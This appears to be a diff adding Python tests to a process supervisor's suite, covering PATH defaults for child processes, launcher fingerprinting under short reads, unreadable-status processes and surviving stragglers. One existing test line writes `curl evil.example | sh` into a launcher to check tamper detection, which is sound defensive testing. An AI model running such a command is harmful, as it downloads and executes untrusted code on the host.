@@ -219,6 +219,16 @@ def test_no_effective_port_means_no_PORT_variable() -> None:
     assert env["LWSM_MANAGED"] == "1"
 
 
+def test_a_manager_started_without_path_still_gives_the_child_one() -> None:
+    """known-issue-056 (LWSM-1321): no PATH in, the system default out.
+
+    A launcher's own commands resolve against the PATH it is given, so a child
+    with none cannot find `npm` or `node` even where they are installed.
+    """
+    assert build_child_env(port=None, base={})["PATH"] == os.defpath
+    assert build_child_env(port=None, base={"PATH": "/opt/x"})["PATH"] == "/opt/x"
+
+
 def test_locale_variables_pass_by_prefix_but_arbitrary_ones_do_not() -> None:
     env = build_child_env(
         port=None, base={"LC_ALL": "C", "LC_TIME": "en_GB.UTF-8", "LCD_BRIGHT": "9"}
@@ -355,6 +365,53 @@ def test_an_oversized_launcher_does_not_fingerprint_as_its_first_megabyte(
 
     launcher.write_bytes(prefix + b"\ncurl evil.example | sh\n")
     assert launcher_fingerprint(project, argv) != capped
+
+
+def test_a_short_read_still_fingerprints_the_whole_launcher(
+    project: Path, monkeypatch
+) -> None:
+    """known-issue-056 (LWSM-1321): one `os.read` may return less than asked.
+
+    Forced here to three bytes a call. A single read then hashes a three-byte
+    prefix as the whole file, so an edit past it never changes the digest.
+    """
+    argv = ("./start.sh",)
+    launcher = project / "start.sh"
+    launcher.write_bytes(b"#!/bin/sh\necho one\n")
+    launcher.chmod(0o700)
+    whole = launcher_fingerprint(project, argv)
+
+    real_read = supervisor_module.os.read
+    monkeypatch.setattr(
+        supervisor_module.os, "read", lambda fd, n: real_read(fd, min(n, 3))
+    )
+    assert launcher_fingerprint(project, argv) == whole, (
+        "a short read fingerprinted a prefix of the launcher"
+    )
+
+
+def test_a_process_whose_status_cannot_be_read_counts_as_alive() -> None:
+    """known-issue-056 (LWSM-1321): AccessDenied is not death.
+
+    Under hidepid or an LSM the status read is refused for a process that is
+    running. Counted as dead, the stop loop gave up early on it.
+    """
+
+    class Unreadable:
+        pid = 4242
+
+        def is_running(self) -> bool:
+            return True
+
+        def status(self) -> str:
+            raise psutil.AccessDenied(self.pid)
+
+    class Gone(Unreadable):
+        def is_running(self) -> bool:
+            raise psutil.NoSuchProcess(self.pid)
+
+    assert supervisor_module._alive(Unreadable())
+    assert not supervisor_module._alive(Gone())
 
 
 def test_an_oversized_launcher_is_refused(
@@ -1245,6 +1302,50 @@ def test_a_straggler_the_kill_did_not_reach_is_reported(
 
 
 @pytest.mark.integration
+def test_a_straggler_that_survived_the_stop_blocks_the_next_start(
+    supervisor: Supervisor, project: Path, monkeypatch
+) -> None:
+    """known-issue-040: a survivor is kept, not forgotten (LWSM-1321).
+
+    Forgotten, the next Start passed `AlreadyRunning` and spawned a SECOND
+    server beside a process that could still hold the port. The straggler is a
+    real, live process — injected through `_group_members` for the sibling
+    test's reason, but alive, because the rule is about a survivor that is
+    still there. Once it is gone, Start works again.
+    """
+    write_launcher(project, "echo up\nwhile true; do sleep 0.05; done")
+    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
+    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
+    assert wait_until(lambda: "up" in managed.log_path.read_text(encoding="utf-8"))
+
+    straggler = subprocess.Popen(["sleep", "30"], start_new_session=True)
+    try:
+        real = supervisor._group_members
+        calls: list[int] = []
+
+        def enumerate_with_a_straggler(m):
+            calls.append(1)
+            members = real(m)
+            return members if len(calls) < 3 else [psutil.Process(straggler.pid)]
+
+        monkeypatch.setattr(supervisor, "_group_members", enumerate_with_a_straggler)
+        supervisor.stop(project, grace=0.2)
+        monkeypatch.setattr(supervisor, "_group_members", real)
+
+        with pytest.raises(AlreadyRunning, match="survived"):
+            supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
+
+        straggler.kill()
+        straggler.wait()
+        again = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
+        assert again.pid != managed.pid
+    finally:
+        if straggler.poll() is None:
+            straggler.kill()
+            straggler.wait()
+
+
+@pytest.mark.integration
 def test_stop_escalates_to_kill_when_sigterm_is_ignored(
     supervisor: Supervisor, project: Path
 ) -> None:
@@ -1807,7 +1908,7 @@ def test_two_concurrent_stops_close_the_log_descriptor_once(
     # One of the two owns the sequence; the other finds nothing and says so.
     assert sum(1 for outcome in outcomes if outcome.terminated) == 1
     assert sum(1 for outcome in outcomes if not outcome.terminated) == 1
-    assert supervisor.running() == {}
+    assert not supervisor.running()
 
 
 # --- LWSM-1018: the log cap is a setting ---------------------------------------
